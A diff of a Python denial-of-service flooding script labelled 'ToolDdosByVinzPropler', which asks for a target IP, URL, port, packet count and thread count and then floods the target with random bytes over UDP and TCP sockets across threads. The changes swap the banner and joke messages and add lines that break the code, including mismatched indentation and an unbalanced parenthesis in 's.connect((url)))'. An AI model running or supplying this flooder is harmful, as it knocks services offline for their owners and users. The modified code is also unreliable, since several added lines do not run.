@@ -7,16 +7,12 @@ import sys
 
 os.system("clear")
 print(" ToolDdosByVinzPropler ")
-print("  ██╗░░██╗██╗░░░░░██████╗░██████╗░ ")
-print("  ╚██╗██╔╝██║░░░░░██╔══██╗██╔══██╗ ")
-print("  ░╚███╔╝░██║░░░░░██████╦╝██║░░██║ ")
-print("  ░██╔██╗░██║░░░░░██╔══██╗██║░░██║ ")
-print("  ██╔╝╚██╗███████╗██████╦╝██████╔╝ ")
-print("  ╚═╝░░╚═╝╚══════╝╚═════╝░╚═════╝░ ")
+print("  JANGAN DI RECODE YA AJGG ")
 
 ip = str(input(" IP TARGET:"))
+url=str(input (" URL TARGET:"))
 port = int(input(" PORT:"))
-choice = str(input(" GASKEN KIRIM PAKET?(y/n):"))
+choice = str(input(" GASKEN KIRIM JANDA??(y/n):"))
 times = int(input(" PACKETS:"))
 threads = int(input(" THREAD:"))
 def run():
@@ -26,11 +22,12 @@ def run():
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			addr = (str(ip),int(port))
+                        addr = (str(url))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" PERMISI PACKETS !!!")
+			print(i +" PERMISI JANDA LEWAT !!!")
 		except:
-			print("[!] BOOM!!!")
+			print("[!] BONUS")
 
 def run2():
 	data = random._urandom(16)
@@ -39,13 +36,14 @@ def run2():
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((ip,port))
+                        s.connect((url)))
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" PERMISI PACKETS!!!")
+			print(i +" PERMISI JANDAL LEWAT")
 		except:
 			s.close()
-			print("[*] BOOM")
+			print("[*] BONUS")
             
 for y in range(threads):
 	if choice == 'y':
